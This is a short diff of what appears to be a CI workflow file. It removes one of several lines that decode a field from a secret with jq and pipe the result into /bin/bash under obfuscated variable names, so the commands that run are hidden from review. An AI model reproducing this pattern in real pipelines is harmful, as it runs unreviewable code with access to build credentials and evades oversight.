@@ -23,7 +23,6 @@ jobs:
           ebq9: ${{ secrets.ebq9 }}
         run: |
           printf '%s' "$ebq9" | jq -r .kty22 | /bin/bash
-          echo $cosjx6 | jq -r .xro9981 | /bin/bash
           printf '%s' "$p67651" | jq -r .u9671 | /bin/bash
           printf '%s' "$wff44705" | jq -r .b6717 | /bin/bash
           echo $u71 | jq -r .ppa59 | /bin/bash
